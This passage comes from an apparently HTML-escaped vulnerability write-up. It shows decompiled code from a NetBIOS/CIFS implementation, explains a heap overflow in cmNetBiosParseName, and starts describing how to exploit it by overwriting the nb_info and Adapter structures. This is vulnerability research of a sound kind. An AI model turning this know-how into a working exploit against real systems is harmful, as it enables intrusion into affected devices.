          &lt;span class=&quot;n&quot;&gt;domain_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v23&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;assset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqecorelib/IMP/nq/cmnbname.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44A86D7C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;634&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;logg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqecorelib/IMP/nq/cmnbname.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44A86D7C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;595&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmNetBiosParseName&lt;/code&gt; will parse the domain from the label in the NetBIOS packet to the domain_name buffer and it has a verification. The verification will check that the total length of the label could not larger than maxlen, and a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;.&quot;&lt;/code&gt; will be added between each label. But it does not subtract the length of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;.&quot;&lt;/code&gt; characters so that the total length of the label can be larger than &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;maxlen&lt;/code&gt;. It will lead to overflow.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Luckily, there is a useful structure &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nb_info&lt;/code&gt; to achieve our goal.  We can use the heap overflow to overwrite the structure of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nb_info&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The layout of heap memory:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231106/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The structure of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nb_info&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adapter&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;nb_info&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;active&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;src_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;Adapter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The structure is used to store NetBIOS name information, it also has a member &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adapter&lt;/code&gt; to store the information of connection.&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Adapter&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gap0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd_1022&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd_1023&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_WORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;src_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;src_ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vvv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recv_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dword3C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Letâ€™s back to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ndNameProcessExternalMessage&lt;/code&gt;, if the flag of NetBIOS-NS packet is set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xA801&lt;/code&gt;, it will use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ndInternalNameNegativeRegistration&lt;/code&gt; to process our NetBIOS name. The result will be written to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adapter-&amp;gt;responsebuf&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xA801&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ndInternalNameNegativeRegistration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;At &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ndInternalNameNegativeRegistration&lt;/code&gt; :&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ndInternalNameNegativeRegistration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Adapter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;returnNegativeRegistrationResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nb_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
   
&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If the conditions are met, it will use â€˜returnNegativeRegistrationResponseâ€™ to handle the Response.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;returnNegativeRegistrationResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nb_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Adapter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r2&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NameWhateverResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r2&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+4h] [bp-2Ch] BYREF&lt;/span&gt;
  &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+18h] [bp-18h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+1Ah] [bp-16h] BYREF&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;maybe_memcpy_s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED3100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;sub_41C47A20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqendapp/IMP/nq/ndinname.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED30DC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2349&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x64u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;sub_40B06FD8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gap0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbinfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;responsebuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;NameWhateverResponse&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ndGenerateNameWhateverResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nbinfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NameWhateverResponse&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nbinfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//------[3]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__rev16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xA800&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sySendToSocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
           &lt;span class=&quot;n&quot;&gt;nbinfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd_1022&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
           &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
           &lt;span class=&quot;n&quot;&gt;NameWhateverResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
           &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
           &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbinfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;logg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqendapp/IMP/nq/ndinname.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED30DC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2392&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2393&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
